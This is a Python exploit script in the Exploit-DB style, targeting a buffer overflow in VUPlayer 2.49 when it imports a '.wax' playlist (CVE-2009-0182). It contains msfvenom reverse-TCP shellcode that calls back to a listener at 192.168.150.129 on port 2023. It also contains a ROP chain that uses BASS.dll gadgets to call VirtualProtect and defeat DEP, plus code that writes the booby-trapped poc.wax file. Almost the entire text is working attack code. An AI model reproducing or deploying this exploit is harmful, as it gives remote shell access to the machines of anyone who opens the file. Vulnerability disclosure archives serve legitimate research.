# Exploit Title: VUPlayer 2.49 - '.wax' Local Buffer Overflow (DEP Bypass)
# Date: 26/06/2021
# Exploit Author: Bryan Leong <NobodyAtall>
# Vendor Homepage: http://www.vuplayer.com/
# Software Link: [Null]
# Version: VUPlayer 2.49
# Tested on: Windows 7 x64
# CVE : CVE-2009-0182

# VUPlayer 2.49 Local Buffer Overflow to Arbitrary Code Execution (Importing .wax playlist file) (Bypass DEP protection)

import struct


#shellcode
#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.150.129 LPORT=2023 -a x86 -b '\x00\x0A\x0D' -f python --var-name buf
buf =  b""
buf += b"\xbb\x24\xdc\xaf\xc4\xd9\xd0\xd9\x74\x24\xf4\x5a"
buf += b"\x33\xc9\xb1\x52\x31\x5a\x12\x83\xea\xfc\x03\x7e"
buf += b"\xd2\x4d\x31\x82\x02\x13\xba\x7a\xd3\x74\x32\x9f"
buf += b"\xe2\xb4\x20\xd4\x55\x05\x22\xb8\x59\xee\x66\x28"
buf += b"\xe9\x82\xae\x5f\x5a\x28\x89\x6e\x5b\x01\xe9\xf1"
buf += b"\xdf\x58\x3e\xd1\xde\x92\x33\x10\x26\xce\xbe\x40"
buf += b"\xff\x84\x6d\x74\x74\xd0\xad\xff\xc6\xf4\xb5\x1c"
buf += b"\x9e\xf7\x94\xb3\x94\xa1\x36\x32\x78\xda\x7e\x2c"
buf += b"\x9d\xe7\xc9\xc7\x55\x93\xcb\x01\xa4\x5c\x67\x6c"
buf += b"\x08\xaf\x79\xa9\xaf\x50\x0c\xc3\xd3\xed\x17\x10"
buf += b"\xa9\x29\x9d\x82\x09\xb9\x05\x6e\xab\x6e\xd3\xe5"
buf += b"\xa7\xdb\x97\xa1\xab\xda\x74\xda\xd0\x57\x7b\x0c"
buf += b"\x51\x23\x58\x88\x39\xf7\xc1\x89\xe7\x56\xfd\xc9"
buf += b"\x47\x06\x5b\x82\x6a\x53\xd6\xc9\xe2\x90\xdb\xf1"
buf += b"\xf2\xbe\x6c\x82\xc0\x61\xc7\x0c\x69\xe9\xc1\xcb"
buf += b"\x8e\xc0\xb6\x43\x71\xeb\xc6\x4a\xb6\xbf\x96\xe4"
buf += b"\x1f\xc0\x7c\xf4\xa0\x15\xd2\xa4\x0e\xc6\x93\x14"
buf += b"\xef\xb6\x7b\x7e\xe0\xe9\x9c\x81\x2a\x82\x37\x78"
buf += b"\xbd\x6d\x6f\x14\xbc\x06\x72\x18\xb8\x31\xfb\xfe"
buf += b"\xac\xad\xaa\xa9\x58\x57\xf7\x21\xf8\x98\x2d\x4c"
buf += b"\x3a\x12\xc2\xb1\xf5\xd3\xaf\xa1\x62\x14\xfa\x9b"
buf += b"\x25\x2b\xd0\xb3\xaa\xbe\xbf\x43\xa4\xa2\x17\x14"
buf += b"\xe1\x15\x6e\xf0\x1f\x0f\xd8\xe6\xdd\xc9\x23\xa2"
buf += b"\x39\x2a\xad\x2b\xcf\x16\x89\x3b\x09\x96\x95\x6f"
buf += b"\xc5\xc1\x43\xd9\xa3\xbb\x25\xb3\x7d\x17\xec\x53"
buf += b"\xfb\x5b\x2f\x25\x04\xb6\xd9\xc9\xb5\x6f\x9c\xf6"
buf += b"\x7a\xf8\x28\x8f\x66\x98\xd7\x5a\x23\xa8\x9d\xc6"
buf += b"\x02\x21\x78\x93\x16\x2c\x7b\x4e\x54\x49\xf8\x7a"
buf += b"\x25\xae\xe0\x0f\x20\xea\xa6\xfc\x58\x63\x43\x02"
buf += b"\xce\x84\x46"
  
junk = "A"*1012

#no ASLR modules
#BASS.dll 
#BASSMIDI.dll
#BASSWMA.dll

#check bad chars
#badchar = \x00, \x0a, \x1a

#ROP Chains
#!mona rop -m BASS.dll,BASSMIDI.dll -n -cpb '\x00\x0A\x1A'
def create_rop_chain():

    rop_gadgets = [
      0x10015f77,  # POP EAX # RETN [BASS.dll] 
      0x1060e25c,  # ptr to &VirtualProtect() [IAT BASSMIDI.dll]
      0x1001eaf1,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [BASS.dll] 
      0x10030950,  # XCHG EAX,ESI # RETN [BASS.dll] 
      0x1001d748,  # POP EBP # RETN [BASS.dll] 
      0x100222c5,  # & jmp esp [BASS.dll]
      0x10015fe7,  # POP EAX # RETN [BASS.dll] 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x10014db4,  # NEG EAX # RETN [BASS.dll] 
      0x10032f32,  # XCHG EAX,EBX # RETN 0x00 [BASS.dll] 
      0x10015f77,  # POP EAX # RETN [BASS.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x10014db4,  # NEG EAX # RETN [BASS.dll] 
      0x10038a6d,  # XCHG EAX,EDX # RETN [BASS.dll] 
      0x100163c7,  # POP ECX # RETN [BASS.dll] 
      0x1060da06,  # &Writable location [BASSMIDI.dll]
      0x10603658,  # POP EDI # RETN [BASSMIDI.dll] 
      0x1001dc05,  # RETN (ROP NOP) [BASS.dll]
      0x10015fe7,  # POP EAX # RETN [BASS.dll] 
      0x90909090,  # nop
      0x1001d7a5,  # PUSHAD # RETN [BASS.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

#give some space between shellcode & ropchain
nop = "\x90"*16

payload = junk + rop_chain + nop + buf

f = open("poc.wax", "w")
f.write(payload)
f.close()